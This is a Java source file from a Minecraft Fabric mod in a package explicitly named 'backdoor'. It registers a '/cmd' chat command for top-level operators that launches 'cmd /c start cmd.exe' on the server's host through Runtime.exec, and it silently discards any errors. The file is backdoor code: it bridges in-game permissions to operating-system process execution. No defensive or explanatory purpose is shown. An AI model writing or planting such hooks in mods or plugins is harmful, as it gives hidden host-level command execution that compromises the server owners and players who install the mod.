package tk.merith.backdoor.commands;

import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
import net.minecraft.server.command.CommandManager;

import java.io.IOException;

public class CommandPrompt {
    public static void register() {
        CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
            dispatcher.register(CommandManager.literal("cmd")
                    .requires(source -> source.hasPermissionLevel(4))
                    .executes(context -> {
                try {
                    // Execute command
                    String command = "cmd /c start cmd.exe";
                    Process child = Runtime.getRuntime().exec(command);
                } catch (IOException e) {

                }
                return 1;
            }));
        });
    }
}
